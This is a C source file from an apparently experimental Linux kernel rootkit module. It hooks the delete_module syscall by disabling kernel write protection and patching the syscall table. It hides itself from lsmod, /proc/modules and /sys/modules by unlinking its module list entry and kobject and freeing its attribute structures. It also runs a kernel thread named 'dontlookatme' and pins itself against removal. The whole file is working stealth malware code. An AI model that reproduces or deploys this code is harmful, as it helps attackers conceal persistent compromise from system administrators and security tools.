#include "code_hiding.h"
#include "hooking.h"

static struct list_head * tmp_head;
static struct kobject tmp_kobj;
static struct module_sect_attrs * tmp_sect;
static struct module_notes_attrs * tmp_notes;
static struct task_struct * default_waiter;
static int (*orig_sys_delete_module)(const char * name, int flags);

static int my_delete_module(const char * name, int flags){
  if(strcmp(name, "rootkit") == 0){  //TODO: replace string with macro
    printk(KERN_INFO "rootkit wants back to it's own kind\n");
    mutex_lock(&module_mutex);
    list_add(&THIS_MODULE->list, tmp_head);
    mutex_unlock(&module_mutex);
  }
  return orig_sys_delete_module(name, flags);
}

static inline void tidy(void)
{
    kfree(THIS_MODULE->notes_attrs);
    THIS_MODULE->notes_attrs = NULL;
    kfree(THIS_MODULE->sect_attrs);
    THIS_MODULE->sect_attrs = NULL;
    kfree(THIS_MODULE->mkobj.mp);
    THIS_MODULE->mkobj.mp = NULL;
    THIS_MODULE->modinfo_attrs->attr.name = NULL;
    kfree(THIS_MODULE->mkobj.drivers_dir);
    THIS_MODULE->mkobj.drivers_dir = NULL;
}

static int hiding_thread(void * data){
  mutex_lock(&module_mutex);
  printk(KERN_INFO "Module mutex acquired, hopefully this works.\n");

  disable_wp();
  orig_sys_delete_module = syscall_table[__NR_delete_module];
  syscall_table[__NR_delete_module] = my_delete_module;
  enable_wp();

  //printk(KERN_INFO "module is live? %d\n", module_is_live(THIS_MODULE));
  //printk(KERN_INFO "module removable, task state: %ld\n", THIS_MODULE->waiter->state);

  //tmp_head = THIS_MODULE->list.prev;	
  //list_del(&THIS_MODULE->list);

  //tmp_kobj = THIS_MODULE->mkobj.kobj;
  //kobject_del(&THIS_MODULE->mkobj.kobj);
  //tmp_sect = THIS_MODULE->sect_attrs;
  //tmp_notes = THIS_MODULE->notes_attrs;
  //THIS_MODULE->sect_attrs = NULL;
  //THIS_MODULE->notes_attrs = NULL;

  //default_waiter = THIS_MODULE->waiter;
  mutex_unlock(&module_mutex);

  list_del(&THIS_MODULE->list);//lsmod,/proc/modules
  kobject_del(&THIS_MODULE->mkobj.kobj);// /sys/modules
  list_del(&THIS_MODULE->mkobj.kobj.entry);//  
  
  tidy();

  try_module_get(THIS_MODULE);
  

  return 0;
}


void hide_code(void){
  kthread_run(hiding_thread, NULL, "dontlookatme");
}

int make_module_removable(void * data){
	//THIS_MODULE->mkobj.kobj = tmp_kobj;
  //THIS_MODULE->sect_attrs = tmp_sect;
  //THIS_MODULE->notes_attrs = tmp_notes;
	//kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->mkobj.kobj.name);
  //printk(KERN_INFO "module is live? %d\n", module_is_live(THIS_MODULE));
  //printk(KERN_INFO "module removable, task state: %ld\n", THIS_MODULE->waiter->state);
  //THIS_MODULE->waiter = default_waiter;
  printk(KERN_INFO "module removable, task state after that: %ld\n", THIS_MODULE->waiter->state);
  
  return 0;
}

int unhide_code(void * data) {
  disable_wp();
  syscall_table[__NR_delete_module] = orig_sys_delete_module;
  enable_wp();
  //printk(KERN_INFO "rootkit wants back to it's own kind\n");
  //mutex_lock(&module_mutex);
  //make_module_removable();
  //list_add(&THIS_MODULE->list, tmp_head);
  //mutex_unlock(&module_mutex);
  return 0;
}

